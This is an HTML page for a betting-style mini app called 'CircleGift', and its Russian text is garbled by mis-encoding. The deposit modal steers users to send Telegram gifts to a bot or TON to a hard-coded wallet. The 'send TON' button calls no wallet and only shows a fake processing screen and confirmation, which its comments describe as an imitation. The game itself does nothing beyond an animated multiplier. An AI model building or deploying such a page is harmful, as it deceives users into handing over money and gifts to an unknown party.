<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CircleGift</title>
    <style>
        :root {
            --bg: #0d1012;
            --card: #1c1f24;
            --blue: #007bff;
            --green: #28a745;
            --red: #dc3545;
            --text-sec: #848e9c;
            --border: #2b3139;
        }
        
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
        body { background: var(--bg); color: white; overflow: hidden; height: 100vh; display: flex; flex-direction: column; }

        /* HEADER */
        .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--border); }
        .balance-box { background: var(--card); padding: 5px 15px; border-radius: 20px; display: flex; align-items: center; gap: 8px; border: 1px solid var(--border); cursor: pointer; }

        /* GAME AREA */
        .game-view { flex: 1; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .rocket-anim { font-size: 80px; margin-bottom: 20px; transition: transform 0.1s; }
        .multiplier { font-size: 64px; font-weight: 900; }

        /* MODAL SYSTEM */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 100; display: none; align-items: flex-end; backdrop-filter: blur(10px); }
        .modal-box { background: #171717; width: 100%; border-radius: 24px 24px 0 0; padding: 20px; animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }

        .tabs { display: flex; background: #262628; border-radius: 12px; padding: 3px; margin: 20px 0; }
        .tab-btn { flex: 1; padding: 8px; border-radius: 10px; border: none; background: none; color: var(--text-sec); font-weight: 600; cursor: pointer; }
        .tab-btn.active { background: var(--blue); color: white; }

        .content-section { display: none; }
        .content-section.active { display: block; }

        /* WALLET VIEW */
        .wallet-info { text-align: center; padding: 20px 0; }
        .masked-addr { color: var(--text-sec); font-size: 14px; margin-bottom: 15px; letter-spacing: 1px; }
        .amount-input { background: none; border: none; color: white; font-size: 40px; text-align: center; width: 100%; outline: none; font-weight: 700; margin: 10px 0; }
        
        .btn-main { width: 100%; padding: 16px; border-radius: 14px; border: none; background: var(--blue); color: white; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
        
        /* PROCESSING OVERLAY (FROM VIDEO) */
        #processing-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 200;
            display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center;
        }
        .loader { width: 50px; height: 50px; border: 4px solid #333; border-top-color: var(--blue); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header">
    <div style="color:var(--green)">‚óè 134</div>
    <div class="balance-box" onclick="showModal()">
        <span id="bal">0.00</span>
        <span style="background:var(--blue); width:20px; height:20px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:14px;">+</span>
    </div>
</div>

<div class="game-view">
    <div class="rocket-anim" id="rocket">üöÄ</div>
    <div class="multiplier" id="mult">1.00x</div>
    <button class="btn-main" style="width: 80%; margin-top: 30px;">–°–¥–µ–ª–∞—Ç—å —Å—Ç–∞–≤–∫—É</button>
</div>

<div class="modal-overlay" id="payment-modal" onclick="hideModal()">
    <div class="modal-box" onclick="event.stopPropagation()">
        <div style="width:40px; height:4px; background:#333; border-radius:2px; margin:0 auto 10px;"></div>
        <h2 style="text-align:center; font-size:20px;">–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ —Å—á—ë—Ç–∞</h2>

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('gifts', this)">–ü–æ–¥–∞—Ä–∫–∏</button>
            <button class="tab-btn" onclick="switchTab('wallet', this)">–ö–æ—à–µ–ª—ë–∫</button>
            <button class="tab-btn" onclick="switchTab('stars', this)">–ó–≤—ë–∑–¥—ã</button>
        </div>

        <div id="gifts" class="content-section active">
            <p style="margin-bottom:15px; font-size:14px; color:#ccc;">1. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ –ø—Ä–æ—Ñ–∏–ª—å @GiftUpRelayer</p>
            <p style="margin-bottom:15px; font-size:14px; color:#ccc;">2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –ª—é–±–æ–π –ø–æ–¥–∞—Ä–æ–∫ –±–æ—Ç—É</p>
            <button class="btn-main" onclick="window.location.href='tg://resolve?domain=GiftUpRelayer'">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–æ–¥–∞—Ä–æ–∫</button>
        </div>

        <div id="wallet" class="content-section">
            <div class="wallet-info">
                <div class="masked-addr">–ê–¥—Ä–µ—Å: UQAC‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢FrYm</div>
                <input type="number" class="amount-input" placeholder="–°—É–º–º–∞" id="ton-sum">
                <div style="display:flex; gap:10px;">
                    <button class="btn-main" style="background:#333; flex:1;" onclick="copyMyWallet()">–ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å</button>
                    <button class="btn-main" style="flex:2;" onclick="startPay()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å TON</button>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="processing-overlay">
    <div class="loader"></div>
    <h3>Confirm the transaction<br>in Wallet</h3>
    <p style="color:var(--text-sec); margin-top:10px; font-size:14px;">It will only take a moment.</p>
</div>

<script>
    const MY_ADDR = "UQACY26GcYX7nuL1iFd1wcDDQOubtLA90njWFRDzo-JVFrYm";

    function showModal() { document.getElementById('payment-modal').style.display = 'flex'; }
    function hideModal() { document.getElementById('payment-modal').style.display = 'none'; }

    function switchTab(id, btn) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.content-section').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(id).classList.add('active');
    }

    function copyMyWallet() {
        navigator.clipboard.writeText(MY_ADDR);
        alert("–ê–¥—Ä–µ—Å —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω!");
    }

    function startPay() {
        const sum = document.getElementById('ton-sum').value;
        if(!sum || sum <= 0) return alert("–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É");
        
        hideModal();
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ–∫–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–∞–∫ –≤ –≤–∏–¥–µ–æ
        const overlay = document.getElementById('processing-overlay');
        overlay.style.display = 'flex';

        // –ò–º–∏—Ç–∞—Ü–∏—è –≤—ã–∑–æ–≤–∞ –∫–æ—à–µ–ª—å–∫–∞
        setTimeout(() => {
            overlay.innerHTML = `
                <div style="font-size:50px;">‚úÖ</div>
                <h3 style="margin-top:20px;">–ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω</h3>
                <p style="padding:20px; color:var(--text-sec);">–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–∞—à –∫–æ—à–µ–ª—ë–∫ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –æ–ø–ª–∞—Ç—ã.</p>
                <button class="btn-main" onclick="location.reload()">–í–µ—Ä–Ω—É—Ç—å—Å—è</button>
            `;
        }, 3000);
    }

    // –ü—Ä–æ—Å—Ç–∞—è –∞–Ω–∏–º–∞—Ü–∏—è —Ä–∞–∫–µ—Ç—ã –¥–ª—è –∫—Ä–∞—Å–æ—Ç—ã
    let m = 1.00;
    setInterval(() => {
        m += 0.01;
        document.getElementById('mult').innerText = m.toFixed(2) + 'x';
        document.getElementById('rocket').style.transform = `translateY(${Math.sin(Date.now()/200)*5}px)`;
    }, 100);
</script>

</body>
</html>
